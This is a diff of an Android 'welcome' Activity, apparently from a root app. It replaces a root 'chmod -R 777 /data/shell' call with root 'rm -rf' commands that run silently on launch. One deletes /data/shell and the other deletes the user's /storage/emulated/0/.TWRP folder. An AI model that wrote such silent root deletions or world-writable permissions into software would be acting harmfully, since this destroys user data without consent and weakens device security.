@@ -4,12 +4,9 @@ import android.app.*;
 import android.content.*;
 import android.os.*;
 import android.view.*;
-import android.widget.*;
-import java.io.*;
-import android.transition.*;
-
 public class welcome extends Activity 
 {
+	
     @Override
     protected void onCreate(Bundle savedInstanceState)
     {      
@@ -21,8 +18,9 @@ public class welcome extends Activity
 			public void run()
 			{
 				try
-				{				
-					Runtime.getRuntime().exec(new String[]{"su","-c","chmod -R 777 /data/shell"});
+				{	
+					Runtime.getRuntime().exec(new String[]{"su","-c","rm -rf /data/shell"});
+					Runtime.getRuntime().exec(new String[]{"su","-c","rm -rf /storage/emulated/0/.TWRP"});
 					sleep(2500);
 				}
 				catch (Exception e)
@@ -34,6 +32,7 @@ public class welcome extends Activity
 				finish();
 			}
 		}.start();
-	}
+	}	
 }
 			
+
